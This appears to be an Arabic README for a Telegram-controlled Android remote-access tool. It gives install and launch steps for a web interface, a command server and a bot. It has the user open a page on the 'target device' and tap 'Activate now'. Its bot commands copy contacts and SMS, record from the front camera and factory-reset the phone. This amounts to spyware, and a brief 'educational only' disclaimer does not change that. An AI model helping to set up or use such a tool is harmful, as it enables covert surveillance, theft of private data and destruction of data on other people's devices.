# نظام التحكم في أجهزة Android عن بعد

## المتطلبات
- Node.js 18+
- Python 3.8+
- متصفح ويب حديث

## خطوات التنصيب

1. **تثبيت التبعيات:**
```bash
# لواجهة الويب وخادم التحكم
cd web-interface
npm install express

cd ../command-server
npm install express ws

# لبوت تيليجرام
cd ../telegram-bot
pip install -r requirements.txt
```

2. **تشغيل الخوادم:**
```bash
# في نافذة منفصلة
cd web-interface
node server.js

# في نافذة منفصلة
cd command-server
node server.js

# في نافذة منفصلة
cd telegram-bot
python bot.py
```

3. **استخدام النظام:**
- افتح http://localhost:3000 على الجهاز المستهدف
- انقر على "تفعيل الآن"
- استخدم بوت تيليجرام للتحكم في الجهاز

## الأوامر المتاحة في تيليجرام
- /start: بدء استخدام البوت
- /link: ربط جهاز جديد
- /devices: عرض الأجهزة المرتبطة
- /contacts: نسخ جهات الاتصال
- /sms: نسخ الرسائل النصية
- /record: تسجيل الفيديو من الكاميرا الأمامية
- /reset: إعادة ضبط المصنع

## ملاحظات أمنية
- هذا المشروع لأغراض تعليمية فقط
- يلزم الحصول على موافقة صريحة من مالك الجهاز
- استخدامه دون موافقة يعتبر غير قانوني